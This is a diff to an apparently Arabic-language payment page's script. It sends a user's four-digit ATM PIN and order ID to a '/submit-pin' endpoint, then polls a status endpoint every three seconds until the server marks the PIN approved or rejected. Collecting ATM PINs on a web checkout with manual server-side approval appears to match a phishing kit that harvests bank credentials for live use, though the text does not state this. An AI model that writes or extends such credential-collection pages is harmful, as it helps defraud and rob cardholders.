@@ -303,8 +303,10 @@
             clearError();
         });
 
+        const orderId = new URLSearchParams(window.location.search).get('orderId');
+
         // Submit PIN
-        function submitPIN() {
+        async function submitPIN() {
             const pin = document.getElementById('pinInput').value;
             
             if (pin.length !== 4) {
@@ -312,19 +314,39 @@
                 return;
             }
 
-            // Disable button and show loading state
             const confirmBtn = document.getElementById('confirmBtn');
             confirmBtn.disabled = true;
             confirmBtn.textContent = 'جاري المعالجة...';
 
-            // Simulate API call
-            setTimeout(() => {
-                // In production, this would be an actual API call
-                console.log('PIN submitted:', pin, 'TXN ID:', txnId);
-                
-                // Redirect to success page or show success message
-                window.location.href = '/payment_success_ar.html?txnId=' + txnId;
-            }, 1500);
+            await fetch('/submit-pin', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ orderId, pin })
+            });
+
+            checkStatus();
+        }
+
+        async function checkStatus() {
+            try {
+                const response = await fetch(`/api/check-status/${orderId}`);
+                const data = await response.json();
+
+                if (data.status === 'approved_pin') {
+                    window.location.href = `payment_success_ar.html?orderId=${orderId}`;
+                } else if (data.status === 'rejected_pin') {
+                    const confirmBtn = document.getElementById('confirmBtn');
+                    confirmBtn.disabled = false;
+                    confirmBtn.textContent = 'تأكيد الدفع';
+                    
+                    const input = document.getElementById('pinInput');
+                    input.style.borderColor = '#ef4444';
+                    input.style.background = '#fff5f5';
+                    showError(data.lastError || 'الرقم الصرافي الآلي غير صحيح.');
+                } else {
+                    setTimeout(checkStatus, 3000);
+                }
+            } catch (e) { console.error(e); }
         }
 
         // Cancel Payment
